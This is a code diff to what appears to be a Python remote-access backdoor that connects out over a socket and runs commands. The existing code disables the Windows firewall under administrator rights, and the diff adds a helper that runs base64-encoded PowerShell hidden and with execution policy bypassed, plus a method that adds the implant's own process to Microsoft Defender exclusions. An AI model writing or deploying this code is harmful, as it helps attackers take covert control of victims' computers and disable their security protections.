@@ -16,6 +16,7 @@
         if inf.administrator():
             cmd = "netsh advfirewall set allprofiles state off"
             self.Commande(cmd)
+            self.ExeptionDefenderProc(self.name_proc)
         while True:
             conn_ok = False #<RANDOMSTRING>
             ClientSocket = socket.socket()
@@ -302,6 +303,29 @@
         output = output.decode('cp850') #<RANDOMSTRING>
         payload.result_commande = output
         return output #<RANDOMSTRING>
+
+    def powershell(self, code):
+        """
+        Execute code in Powershell.exe and return any results
+        `Required`
+        :param str code:      script block of Powershell code
+        Returns any output from Powershell executing the code
+        """
+        import os
+        import base64
+        try:
+            powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe') else os.popen('where powershell').read().rstrip()
+            encoded_bytes = base64.b64encode(code.encode('utf-16-le'))
+            encoded_string = str(encoded_bytes, 'utf-8')
+            cmd = '{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, encoded_string)
+            result = self.Commande(cmd)
+            return result
+        except Exception as e:
+            print("error: {}".format(str(e)))
+
+    def ExeptionDefenderProc(self, proc):
+        cmd = "Add-MpPreference -ExclusionProcess {}".format(proc)
+        self.powershell(cmd)
 
     def StartProxy(self, port):
         ADDR = "0.0.0.0"
